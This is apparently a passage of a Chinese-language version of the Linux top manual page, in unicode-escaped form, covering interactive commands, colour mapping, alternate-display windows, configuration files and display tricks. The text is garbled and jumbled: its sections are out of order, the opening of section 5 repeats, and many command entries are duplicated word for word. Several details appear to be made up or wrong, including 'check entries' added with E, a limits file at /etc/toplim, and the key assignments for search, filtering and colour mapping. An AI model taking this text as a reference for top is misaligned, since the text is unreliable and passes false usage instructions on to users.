\u5207\u6362\u989c\u8272\u6620\u5c04\u3002 0 - 7 :\u989c\u8272\u6620\u5c04\u9009\u62e9 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u53ef\u4ee5\u4f7f\u7528 0 \u5230 7 \u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879 5a. \u7a97\u53e3\u6982\u8ff0 \u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\uff0ctop \u63d0\u4f9b\u4e86\u989d\u5916\u7684\u7a97\u53e3\uff0c\u7528\u4e8e\u5c55\u793a\u4e0d\u540c\u7684\u4efb\u52a1\u548c\u7cfb\u7edf\u4fe1\u606f\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 `A` \u4ea4\u4e92\u547d\u4ee4\u5207\u6362\u5230\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u3002 \u6bcf\u4e2a\u7a97\u53e3\u90fd\u53ef\u4ee5\u5355\u72ec\u914d\u7f6e\uff0c\u663e\u793a\u4e0d\u540c\u7684\u5b57\u6bb5\u548c\u6392\u5e8f\u987a\u5e8f\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u63d0\u4f9b\u56db\u4e2a\u7a97\u53e3\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 `g` \u4ea4\u4e92\u547d\u4ee4\u9009\u62e9\u8981\u67e5\u770b\u7684\u7a97\u53e3\u3002\u6bcf\u4e2a\u7a97\u53e3\u90fd\u6709\u81ea\u5df1\u7684\u5b57\u6bb5\u7ec4\u548c\u6392\u5e8f\u987a\u5e8f\uff0c \u5141\u8bb8\u4f60\u5b9a\u5236\u6bcf\u4e2a\u7a97\u53e3\u663e\u793a\u7684\u4fe1\u606f\u3002 5b. \u7a97\u53e3\u547d\u4ee4 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u7ba1\u7406\u7a97\u53e3\uff1a - :\u51cf\u5c0f\u7a97\u53e3\u5bbd\u5ea6 \u51cf\u5c0f\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 _ :\u51cf\u5c0f\u7a97\u53e3\u5bbd\u5ea6 \u51cf\u5c0f\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 = :\u91cd\u7f6e\u7a97\u53e3\u5927\u5c0f \u91cd\u7f6e\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 + :\u589e\u52a0\u7a97\u53e3\u5bbd\u5ea6 \u589e\u52a0\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 A :\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u5207\u6362 \u5207\u6362\u5230\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u3002 a :\u7a97\u53e3\u6dfb\u52a0 \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7a97\u53e3\u3002 g :\u9009\u62e9\u7a97\u53e3 \u9009\u62e9\u8981\u67e5\u770b\u7684\u7a97\u53e3\u3002 G :\u7a97\u53e3\u5220\u9664 \u5220\u9664\u5f53\u524d\u7a97\u53e3\u3002 w :\u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u5c06\u5f53\u524d\u7a97\u53e3\u914d\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 5c. \u7a97\u53e3\u6eda\u52a8 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u6eda\u52a8\u7a97\u53e3\u5185\u5bb9\uff1a C C : \u5149\u6807\u63a7\u5236\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u542f\u7528\u6216\u7981\u7528\u5149\u6807\u63a7\u5236\u529f\u80fd\uff0c\u4ee5\u4fbf\u5728\u7a97\u53e3\u5185\u5bb9\u4e0a\u8fdb\u884c\u5bfc\u822a\u3002 Up : \u5411\u4e0a\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0a\u6eda\u52a8\u4e00\u884c\u3002 Dn : \u5411\u4e0b\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0b\u6eda\u52a8\u4e00\u884c\u3002 Left : \u5411\u5de6\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u5de6\u6eda\u52a8\u4e00\u5217\u3002 Right : \u5411\u53f3\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u53f3\u6eda\u52a8\u4e00\u5217\u3002 PgUp : \u5411\u4e0a\u7ffb\u9875 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0a\u6eda\u52a8\u4e00\u9875\u3002 PgDn : \u5411\u4e0b\u7ffb\u9875 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0b\u6eda\u52a8\u4e00\u9875\u3002 Home : \u8df3\u5230\u5f00\u5934 \u5c06\u7a97\u53e3\u5185\u5bb9\u8df3\u5230\u5f00\u5934\u3002 End : \u8df3\u5230\u7ed3\u5c3e \u5c06\u7a97\u53e3\u5185\u5bb9\u8df3\u5230\u7ed3\u5c3e\u3002 5d. \u7a97\u53e3\u641c\u7d22 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u5728\u7a97\u53e3\u5185\u5bb9\u4e2d\u641c\u7d22\uff1a L : \u5173\u952e\u5b57\u641c\u7d22 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5173\u952e\u5b57\uff0c\u7528\u4e8e\u5728\u7a97\u53e3\u5185\u5bb9\u4e2d\u641c\u7d22\u5339\u914d\u9879\u3002 & : \u5b57\u6bb5\u8fc7\u6ee4 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5b57\u6bb5\u540d\u548c\u4e00\u4e2a\u503c\uff0c\u4ee5\u4fbf\u4ec5\u663e\u793a\u5339\u914d\u8be5\u5b57\u6bb5\u503c\u7684\u4efb\u52a1\u3002 5e. \u7a97\u53e3\u8fc7\u6ee4 \u4f7f\u7528 `&` \u4ea4\u4e92\u547d\u4ee4\u53ef\u4ee5\u5bf9\u7a97\u53e3\u5185\u5bb9\u8fdb\u884c\u8fc7\u6ee4\u3002\u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5b57\u6bb5\u540d\uff08\u4f8b\u5982\uff0c'COMMAND'\uff09\u3002\u5982\u679c\u5b57\u6bb5\u540d\u65e0\u6548\uff0c\u5f53\u524d\u7a97\u53e3\u7684\u6240\u6709\u5b57\u6bb5\u540d\u5c06\u4f5c\u4e3a\u4e0a\u4e0b\u6587\u63d0\u793a\u8fdb\u884c\u663e\u793a\u3002\u8f93\u5165\u5b57\u6bb5\u540d\u540e\uff0c\u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u503c\u3002\u8be5\u503c\u5c06\u4e0e\u5b57\u6bb5\u7684\u5185\u5bb9\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ea\u6709\u90a3\u4e9b\u5339\u914d\u7684\u4efb\u52a1\u624d\u4f1a\u88ab\u663e\u793a\u3002 \u4f60\u53ef\u4ee5\u5728\u8fc7\u6ee4\u5668\u503c\u524d\u6dfb\u52a0\u4e00\u4e2a\u611f\u53f9\u53f7\uff08`!`\uff09\u4ee5\u6392\u9664\u8be5\u503c\u5339\u914d\u7684\u4efb\u52a1\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 `*` \u548c `?` \u8fdb\u884c\u5339\u914d\u3002 \u5728\u63d0\u793a\u8f93\u5165\u884c\u5e76\u4ee5 <Enter> \u952e\u7ec8\u6b62\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0a\u952e\u548c\u4e0b\u952e\u5177\u6709\u7279\u6b8a\u610f\u4e49\u3002\u90a3\u4e9b\u952e\u6216\u5176\u522b\u540d\u53ef\u7528\u4e8e\u68c0\u7d22\u4ee5\u524d\u7684\u8f93\u5165\u884c\uff0c\u7136\u540e\u53ef\u4ee5\u7f16\u8f91\u5e76\u91cd\u65b0\u8f93\u5165\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u952e\u7684\u7279\u6b8a\u610f\u4e49\uff1a \u4e0a\u952e : \u56de\u5fc6\u65e7\u5b57\u7b26\u4e32\u4ee5\u91cd\u65b0\u7f16\u8f91 \u4e0b\u952e : \u56de\u5fc6\u65b0\u5b57\u7b26\u4e32\u6216\u5220\u9664\u6574\u884c Insert : \u5728\u63d2\u5165\u548c\u8986\u76d6\u6a21\u5f0f\u4e4b\u95f4\u5207\u6362 Delete : \u5220\u9664\u5149\u6807\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u79fb\u52a8\u5176\u4ed6\u5b57\u7b26\u5411\u5de6 Home : \u8df3\u81f3\u8f93\u5165\u884c\u7684\u5f00\u5934 End : \u8df3\u81f3\u8f93\u5165\u884c\u7684\u672b\u5c3e 6. \u6587\u4ef6 6a. \u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6 top \u63d0\u4f9b\u4e86\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6765\u4fdd\u5b58\u4f60\u5bf9 top \u754c\u9762\u548c\u884c\u4e3a\u7684\u6240\u6709\u81ea\u5b9a\u4e49\u8bbe\u7f6e\u3002\u914d\u7f6e\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u4e2d\uff0c\u540d\u4e3a `.toprc`\u3002 \u914d\u7f6e\u6587\u4ef6\u5305\u542b\u7684\u8bbe\u7f6e\u5305\u62ec\uff1a\u5b57\u6bb5\u548c\u6392\u5e8f\u3001\u6458\u8981\u533a\u57df\u8bbe\u7f6e\u3001\u5ef6\u8fdf\u65f6\u95f4\u3001\u989c\u8272\u6620\u5c04\u7b49\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7 `W` \u4ea4\u4e92\u547d\u4ee4\u5c06\u5f53\u524d\u914d\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 6b. \u6dfb\u52a0\u68c0\u67e5\u6761\u76ee \u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u68c0\u67e5\u6761\u76ee\u6765\u76d1\u63a7\u7279\u5b9a\u8fdb\u7a0b\u6216\u7cfb\u7edf\u72b6\u6001\u3002\u68c0\u67e5\u6761\u76ee\u5b9a\u4e49\u4e86\u6761\u4ef6\uff0c\u5f53\u8fd9\u4e9b\u6761\u4ef6\u6ee1\u8db3\u65f6\uff0ctop \u5c06\u53d1\u51fa\u8b66\u544a\u6216\u6267\u884c\u64cd\u4f5c\u3002 \u6bcf\u4e2a\u68c0\u67e5\u6761\u76ee\u5305\u542b\u4ee5\u4e0b\u5b57\u6bb5\uff1a - \u540d\u79f0 - \u6761\u4ef6\u8868\u8fbe\u5f0f - \u52a8\u4f5c - \u4f18\u5148\u7ea7 \u4f60\u53ef\u4ee5\u4f7f\u7528 `E` \u547d\u4ee4\u6dfb\u52a0\u65b0\u7684\u68c0\u67e5\u6761\u76ee\uff0c\u6216\u7f16\u8f91\u73b0\u6709\u7684\u68c0\u67e5\u6761\u76ee\u3002 6c. \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6 \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e `/etc/toprc`\uff0c\u7528\u4e8e\u5b9a\u4e49\u7cfb\u7edf\u8303\u56f4\u7684 top \u8bbe\u7f6e\u3002\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u7684\u8bed\u6cd5\u4e0e\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u76f8\u540c\uff0c\u4f46\u4f18\u5148\u7ea7\u8f83\u4f4e\u3002 6d. \u7cfb\u7edf\u9650\u5236\u6587\u4ef6 \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u4f4d\u4e8e `/etc/toplim`\uff0c\u7528\u4e8e\u5b9a\u4e49\u5bf9 top \u64cd\u4f5c\u7684\u9650\u5236\u3002\u8fd9\u4e9b\u9650\u5236\u5305\u62ec\uff1a\u6700\u5927\u4efb\u52a1\u6570\u3001\u6700\u5927\u5b57\u6bb5\u6570\u3001\u6700\u5927\u5185\u5b58\u4f7f\u7528\u7b49\u3002 \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u4e2d\u7684\u8bbe\u7f6e\u5c06\u8986\u76d6\u7528\u6237\u7684\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u8bbe\u7f6e\u3002 7. \u4e00\u4e9b\u5947\u5999\u7684\u6280\u5de7 7a. \u5185\u6838\u9b54\u672f \u4f60\u53ef\u4ee5\u4f7f\u7528 top \u7684\u4ea4\u4e92\u547d\u4ee4\u6765\u67e5\u770b\u548c\u64cd\u4f5c\u5185\u6838\u53c2\u6570\u3002\u4f8b\u5982\uff0c\u4f7f\u7528 `k` \u547d\u4ee4\u53ef\u4ee5\u6740\u6b7b\u4efb\u52a1\uff0c\u4f7f\u7528 `r` \u547d\u4ee4\u53ef\u4ee5\u8c03\u6574\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u3002 7b. \u7a97\u53e3\u5f39\u8df3 \u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 `a` \u547d\u4ee4\u6dfb\u52a0\u65b0\u7a97\u53e3\uff0c\u5e76\u901a\u8fc7 `g` \u547d\u4ee4\u5728\u7a97\u53e3\u4e4b\u95f4\u5207\u6362\u3002\u8fd9\u6837\u53ef\u4ee5\u540c\u65f6\u76d1\u63a7\u591a\u4e2a\u8fdb\u7a0b\u548c\u7cfb\u7edf\u72b6\u6001\u3002 7c. \u5927\u9e1f\u7a97\u53e3 \u4f7f\u7528 top \u7684\u989c\u8272\u6620\u5c04\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u5c06\u91cd\u8981\u7684\u4efb\u52a1\u6216\u72b6\u6001\u7a81\u51fa\u663e\u793a\u4e3a\u4e0d\u540c\u7684\u989c\u8272\u3002\u8fd9\u6837\u53ef\u4ee5\u5728\u5927\u91cf\u4fe1\u606f\u4e2d\u5feb\u901f\u8bc6\u522b\u5173\u952e\u6570\u636e\u3002 7d. \u4ea4\u6362\u7a97\u53e3 \u4f7f\u7528 top \u7684\u7a97\u53e3\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a\u7a97\u53e3\uff0c\u5206\u522b\u663e\u793a\u4e0d\u540c\u7684\u4fe1\u606f\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 `G` \u547d\u4ee4\u5220\u9664\u4e0d\u9700\u8981\u7684\u7a97\u53e3\uff0c\u6216\u4f7f\u7528 `A` \u547d\u4ee4\u5207\u6362\u663e\u793a\u6a21\u5f0f\u3002 8. \u9519\u8bef \u5982\u679c\u4f60\u5728\u4f7f\u7528 top \u65f6\u9047\u5230\u4efb\u4f55\u95ee\u9898\uff0c\u8bf7\u53c2\u9605 top \u7684\u624b\u518c\u9875\u6216\u5728\u7ebf\u6587\u6863\u83b7\u53d6\u5e2e\u52a9\u3002 9. \u53c2\u89c1 \u6709\u5173 top \u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u8d44\u6e90\uff1a - man \u9875\uff1aman top - \u5728\u7ebf\u6587\u6863\uff1ahttps://man7.org/linux/man-pages/man1/top.1.html 4b. \u6458\u8981\u533a\u57df\u547d\u4ee4 \u6458\u8981\u533a\u57df\u547d\u4ee4\u4ec5\u5f71\u54cd\u7a97\u53e3\u7684\u6458\u8981\u90e8\u5206\uff0c\u5b83\u4eec\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u5747\u53ef\u7528\u3002 C : CPU\u4f7f\u7528\u7387\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684CPU\u4f7f\u7528\u7387\u3002 l : \u8d1f\u8f7d\u5e73\u5747\u503c\u548c\u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u8d1f\u8f7d\u5e73\u5747\u503c\u548c\u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u3002 t : \u4efb\u52a1\u548cCPU\u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u4efb\u52a1\u548cCPU\u72b6\u6001\u3002 m : \u5185\u5b58\u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u5185\u5b58\u72b6\u6001\u3002 1 : \u5355/\u591aCPU\u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5355\u4e2aCPU\u7684\u72b6\u6001\u663e\u793a\u5207\u6362\u4e3a\u6240\u6709CPU\u7684\u72b6\u6001\u663e\u793a\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 2 : NUMA\u8282\u70b9\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2aCPU\u72b6\u6001\u884c\u7684\u663e\u793a\u987a\u5e8f\u5c06\u9075\u5faaNUMA\u8282\u70b9\u7684\u987a\u5e8f\u3002\u6b64\u987a\u5e8f\u5728NUMA\u673a\u5668\u4e0a\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\u3002 3 : NUMA\u8282\u70b9\u989c\u8272\u6620\u5c04\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2aCPU\u72b6\u6001\u884c\u5c06\u4f7f\u7528\u4e0d\u540c\u7684\u989c\u8272\u6620\u5c04\uff0c\u4ee5\u4fbf\u66f4\u5bb9\u6613\u533a\u5206\u3002 4 : NUMA\u8282\u70b9\u5e03\u5c40\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0cCPU\u72b6\u6001\u884c\u5c06\u6839\u636eNUMA\u8282\u70b9\u8fdb\u884c\u5206\u7ec4\u548c\u663e\u793a\u3002 ! : \u4ea4\u4e92\u547d\u4ee4\u53d6\u6d88 \u6b64\u547d\u4ee4\u5c06\u53d6\u6d88\u4efb\u4f55\u672a\u5b8c\u6210\u7684\u4ea4\u4e92\u547d\u4ee4\uff0c\u5e76\u8fd4\u56de\u5230\u6b63\u5e38\u7684top\u64cd\u4f5c\u3002 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4 \u4efb\u52a1\u533a\u57df\u547d\u4ee4\u4ec5\u5f71\u54cd\u7a97\u53e3\u7684\u4efb\u52a1\u663e\u793a\u90e8\u5206\u3002\u5b83\u4eec\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u5747\u53ef\u7528\u3002 \u5916\u89c2: b : \u7c97\u4f53\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5f71\u54cd\u7c97\u4f53terminfo\u529f\u80fd\u7684\u4f7f\u7528\uff0c\u5e76\u6539\u53d8\u4efb\u52a1\u533a\u57df\u7684\u663e\u793a\u3002 J : \u5217\u79fb\u52a8 \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u9009\u62e9\u7684\u5217\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u3002 j : \u5217\u79fb\u52a8 \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u9009\u62e9\u7684\u5217\u79fb\u52a8\u5230\u4e0a\u4e00\u4e2a\u4f4d\u7f6e\u3002 x : \u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7a81\u51fa\u663e\u793a\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u7a81\u51fa\u663e\u793a\u5f53\u524d\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 y : \u4efb\u52a1\u7a97\u53e3\u884c\u7a81\u51fa\u663e\u793a\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u7a81\u51fa\u663e\u793a\u4efb\u52a1\u7a97\u53e3\u4e2d\u7684\u6bcf\u4e00\u884c\u3002 z : \u4efb\u52a1\u7a97\u53e3\u989c\u8272\u6620\u5c04\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7a97\u53e3\u5207\u6362\u4e3a\u4f7f\u7528\u4e0d\u540c\u7684\u989c\u8272\u6620\u5c04\u3002 \u5185\u5bb9: c : \u547d\u4ee4\u884c/\u7a0b\u5e8f\u540d\u79f0\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7684\u547d\u4ee4\u884c\u663e\u793a\u5207\u6362\u4e3a\u7a0b\u5e8f\u540d\u79f0\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 f : \u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u54ea\u4e9b\u5b57\u6bb5\u663e\u793a\uff0c\u54ea\u4e9b\u5b57\u6bb5\u7528\u4e8e\u6392\u5e8f\u3002 F : \u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u54ea\u4e9b\u5b57\u6bb5\u663e\u793a\uff0c\u54ea\u4e9b\u5b57\u6bb5\u7528\u4e8e\u6392\u5e8f\u3002 o : \u6392\u5e8f\u5b57\u6bb5\u9009\u62e9 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 O : \u6392\u5e8f\u5b57\u6bb5\u9009\u62e9 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 S : \u7d2f\u79ef\u65f6\u95f4\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7684\u7d2f\u79ef\u65f6\u95f4\u663e\u793a\u5207\u6362\u4e3a\u975e\u7d2f\u79ef\u65f6\u95f4\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 u : \u7528\u6237\u8fc7\u6ee4 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u8fc7\u6ee4\u4e3a\u7279\u5b9a\u7528\u6237\u3002 U : \u7528\u6237\u8fc7\u6ee4 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u8fc7\u6ee4\u4e3a\u7279\u5b9a\u7528\u6237\u3002 V : \u6811\u72b6\u89c6\u56fe\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u5207\u6362\u4e3a\u6811\u72b6\u89c6\u56fe\uff0c\u663e\u793a\u4efb\u52a1\u7684\u7236\u5b50\u5173\u7cfb\u3002 v : \u5b50\u8fdb\u7a0b\u9690\u85cf\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u4efb\u52a1\u7684\u5b50\u8fdb\u7a0b\u3002 \u5927\u5c0f: # : \u4efb\u52a1\u6570\u91cf\u9650\u5236 \u6b64\u547d\u4ee4\u5c06\u9650\u5236\u663e\u793a\u7684\u4efb\u52a1\u6570\u91cf\u3002 i : \u7a7a\u95f2\u4efb\u52a1\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u7a7a\u95f2\u4efb\u52a1\u3002 n : \u4efb\u52a1\u6570\u91cf\u9650\u5236 \u6b64\u547d\u4ee4\u5c06\u9650\u5236\u663e\u793a\u7684\u4efb\u52a1\u6570\u91cf\u3002 \u6392\u5e8f: < : \u53cd\u5411\u6392\u5e8f \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7684\u6392\u5e8f\u987a\u5e8f\u53cd\u8f6c\u3002 > : \u53cd\u5411\u6392\u5e8f \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7684\u6392\u5e8f\u987a\u5e8f\u53cd\u8f6c\u3002 f : \u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 F : \u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 R : \u9ed8\u8ba4\u6392\u5e8f\u6062\u590d \u6b64\u547d\u4ee4\u5c06\u6392\u5e8f\u6062\u590d\u4e3a\u9ed8\u8ba4\u6392\u5e8f\u5b57\u6bb5\u548c\u987a\u5e8f\u3002 4d. \u989c\u8272\u6620\u5c04 \u989c\u8272\u6620\u5c04\u547d\u4ee4\u4ec5\u5728\u989c\u8272\u6620\u5c04\u6a21\u5f0f\u4e0b\u53ef\u7528\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `Z` \u4ea4\u4e92\u547d\u4ee4\u548c `z` \u4ea4\u4e92\u547d\u4ee4\u3002 <Ret> : \u989c\u8272\u6620\u5c04\u9009\u62e9 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u53ef\u4ee5\u4f7f\u75280\u52307\u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 a : \u989c\u8272A \u9009\u62e9\u989c\u8272\u6620\u5c04A\u3002 B : \u989c\u8272B \u9009\u62e9\u989c\u8272\u6620\u5c04B\u3002 b : \u989c\u8272B \u9009\u62e9\u989c\u8272\u6620\u5c04B\u3002 H : \u9ad8\u4eae\u989c\u8272 \u9009\u62e9\u9ad8\u4eae\u989c\u8272\u3002 M : \u666e\u901a\u989c\u8272 \u9009\u62e9\u666e\u901a\u989c\u8272\u3002 q : \u9000\u51fa\u989c\u8272\u6620\u5c04 \u9000\u51fa\u989c\u8272\u6620\u5c04\u9009\u62e9\u3002 S : \u4fdd\u5b58\u989c\u8272\u6620\u5c04 \u4fdd\u5b58\u5f53\u524d\u7684\u989c\u8272\u6620\u5c04\u8bbe\u7f6e\u3002 T : \u5207\u6362\u989c\u8272\u6620\u5c04 \u5207\u6362\u989c\u8272\u6620\u5c04\u3002 w : \u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u5c06\u5f53\u524d\u989c\u8272\u6620\u5c04\u8bbe\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 z : \u5207\u6362\u989c\u8272\u6620\u5c04 \u5207\u6362\u989c\u8272\u6620\u5c04\u3002 0 - 7 : \u989c\u8272\u6620\u5c04\u9009\u62e9 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u53ef\u4ee5\u4f7f\u75280\u52307\u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879 5a. \u7a97\u53e3\u6982\u8ff0 